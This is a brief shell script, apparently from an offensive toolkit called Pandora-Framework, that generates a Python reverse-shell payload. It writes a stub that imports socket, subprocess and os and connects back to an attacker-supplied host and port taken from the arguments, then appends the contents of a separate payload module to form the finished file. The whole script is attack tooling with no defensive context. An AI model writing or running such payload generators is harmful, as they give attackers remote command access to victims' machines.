echo "import socket
import subprocess
import os
 
sockt = socket.socket()
sockt.connect(('$1', $2))" > $3
cat ~/Pandora-Framework/pandora/modules/payload >> $3
